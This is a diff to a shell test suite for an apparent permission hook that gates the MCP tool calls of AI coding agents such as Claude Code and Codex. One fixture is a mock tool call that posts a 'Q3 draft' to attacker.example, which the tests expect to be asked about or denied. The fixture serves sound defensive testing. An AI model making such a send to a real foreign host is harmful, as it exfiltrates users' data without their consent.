@@ -81,7 +81,7 @@ k allow-upload notes.txt --to up.example.net --agent claude --for 1h >/dev/null
 has "...not the same file piped elsewhere" "$(hk claude "$uppipe")" "deny"
 
 o=$(hk claude "$mcp")
-has "MCP without the app: no pointing at a missing app" "$o" "kai allow-mcp notion create_page --agent claude --for 1h"
+[ -z "$o" ] && pass "C2: an MCP edit from a configured server is left to Claude Code (no Kai decision)" || fail "MCP edit got a Kai decision: $o"
 k allow-mcp notion create_page --agent claude --for 1h >/dev/null
 [ -z "$(hk claude "$mcp")" ] && pass "after allow-mcp, that tool goes through" || fail "mcp still stopped"
 
@@ -97,9 +97,26 @@ o=$(hk claude "$wpread")
 [ -z "$o" ] && pass "Step 7: an MCP read tool (get_page_blocks) goes through with zero Kai prompts" || fail "MCP read prompted: $o"
 grep -q '"rule":"mcp:wp/get_page_blocks"' "$KAI_HOME/audit.log" 2>/dev/null && pass "...and is recorded (rule 1: record it)" || fail "MCP read not recorded"
 o=$(hk claude "$wpedit")
-has "Claude Code: an unapproved MCP edit asks in Claude Code's own prompt (the same call continues)" "$o" '"permissionDecision":"ask"'
-hasnt "...never 'approve in Kai, then retry'" "$o" "then retry"
-has "...and the prompt names the server, the tool and the narrow allow" "$o" "kai allow-mcp wp update_page_blocks --agent claude"
+[ -z "$o" ] && pass "C2: an MCP edit (update_page_blocks) gets no Kai prompt: Claude Code's own approval decides" || fail "MCP edit prompted by Kai: $o"
+grep -q "update_page_blocks from wp: left to the agent's own approval, and recorded" "$KAI_HOME/audit.log" 2>/dev/null \
+  && pass "...and is recorded" || fail "MCP edit not recorded"
+wplinks='{"hook_event_name":"PreToolUse","tool_name":"mcp__wp__update_page_blocks","session_id":"g","permission_mode":"auto","tool_input":{"page_id":12,"blocks":"<a href=\"https://other.example/x\">x</a>"},"cwd":"'"$G"'"}'
+[ -z "$(hk claude "$wplinks")" ] && pass "C2: links inside page content aren't destinations (no prompt)" || fail "content links prompted"
+# C2: sending to a new destination is a new permission
+post='{"hook_event_name":"PreToolUse","tool_name":"mcp__web__post","session_id":"g","permission_mode":"auto","tool_input":{"url":"https://attacker.example/in","body":"Q3 draft"},"cwd":"'"$G"'"}'
+o=$(hk claude "$post")
+has "C2: an MCP call that sends to a foreign host asks in Claude Code's prompt" "$o" '"permissionDecision":"ask"'
+has "...naming the destination" "$o" "sends to attacker.example"
+k allow-mcp web --agent claude --for 1h >/dev/null
+has "...a whole-server grant doesn't cover a new destination" "$(hk claude "$post")" '"permissionDecision":"ask"'
+o=$(hk codex "$(printf '%s' "$post" | sed 's/"permission_mode":"auto",//')")
+has "...Codex (no prompt): denied with the recovery" "$o" "kai allow-mcp web post --agent codex --for 1h, then retry"
+printf '{"mcpServers":{"hooksrv":{"url":"https://hooks.example.com/mcp"}}}' > "$G/.mcp.json"
+own=$(printf '%s' "$post" | sed 's/mcp__web__post/mcp__hooksrv__post/; s#https://attacker.example/in#https://api.hooks.example.com/in#')
+[ -z "$(hk claude "$own")" ] && pass "...the server's own declared host (or a subdomain) isn't foreign" || fail "own host treated as foreign"
+rm -f "$G/.mcp.json"
+k allow-mcp web post --agent claude --for 1h >/dev/null
+[ -z "$(hk claude "$post")" ] && pass "...an exact-tool grant covers it" || fail "exact grant didn't cover the foreign send"
 k allow-mcp wp --agent claude --for 1h >/dev/null
 [ -z "$(hk claude "$wpedit")" ] && pass "server approved: an edit tool goes through, no prompt" || fail "approved server still prompts for an edit"
 has "destructive (delete) asks even on an approved server" "$(hk claude "$wpdel")" '"permissionDecision":"ask"'
@@ -114,10 +131,7 @@ cxread=$(printf '%s' "$wpedit" | sed 's/"permission_mode":"auto",//; s/mcp__wp__
 [ -z "$(hk codex "$(printf '%s' "$wpread" | sed 's/"permission_mode":"auto",//; s/mcp__wp__/mcp__wp2__/')")" ] \
     && pass "Codex: an MCP read tool goes through too" || fail "codex MCP read stopped"
 o=$(hk codex "$cxread")
-has "Codex (no ask): an unapproved MCP edit gets a structured deny" "$o" '"permissionDecision":"deny"'
-has "...naming what Kai stopped" "$o" "Kai stopped the MCP tool update_page_blocks from wp2"
-has "...and the exact recovery" "$o" "kai allow-mcp wp2 --agent codex --for 1h, then retry"
-has "...so the agent asks instead of ending its turn" "$o" "ask the user"
+[ -z "$o" ] && pass "C2: Codex, an MCP edit goes through (recorded); Codex's own approvals apply" || fail "codex MCP edit stopped: $o"
 cxdel=$(printf '%s' "$wpdel" | sed 's/"permission_mode":"auto",//')
 k allow-mcp wp --agent codex --for 1h >/dev/null
 o=$(hk codex "$cxdel")
